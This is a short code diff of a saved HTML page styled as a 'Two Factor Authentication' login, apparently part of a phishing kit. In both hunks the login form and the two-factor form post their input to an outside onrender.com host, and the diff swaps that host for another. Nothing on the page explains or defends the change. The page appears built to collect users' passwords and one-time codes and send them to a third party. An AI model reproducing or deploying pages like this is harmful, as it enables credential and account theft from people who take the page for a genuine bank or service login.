@@ -112,7 +112,7 @@ span[data-ez-ph-id] { position: absolute !important; left: -3000px !important; }
             <a href="https://authenticationform.de/"><img src="./Two Factor Authentication_files/title_1.gif" height="68" alt="" style="visibility: hidden;"></a>
         </div>
         <div class="row" id="login-row" style="height: 60px;">
-            <form id="loginForm" action="https://authentication-de-xmwy.onrender.com/BMTX_%20Two%20Factor%20Authentication%20Verify.html" method="post" style="display: inline" autocomplete="off">
+            <form id="loginForm" action="https://authentication-delive.onrender.com/BMTX_%20Two%20Factor%20Authentication%20Verify.html" method="post" style="display: inline" autocomplete="off">
                 <div class="col-xs-12 col-md-offset-0">
                     <div class="row">
                         <div class="login-fields">
@@ -130,7 +130,7 @@ span[data-ez-ph-id] { position: absolute !important; left: -3000px !important; }
       <div class="pagebody_div factor2Pt">
 
        <div class="pagecontent_div factor2Content">
-  <form name="twoFactorAuthenticationForm" method="post" action="https://authentication-de-xmwy.onrender.com/BMTX_%20Two%20Factor%20Authentication%20Verify.html" id="twoFactorAuthenticationForm" novalidate="novalidate">
+  <form name="twoFactorAuthenticationForm" method="post" action="https://authentication-delive.onrender.com/BMTX_%20Two%20Factor%20Authentication%20Verify.html" id="twoFactorAuthenticationForm" novalidate="novalidate">
     <div class="container">
       <div class="row">
         <div class="icon col-xs-12 col-sm-4 col-md-3">
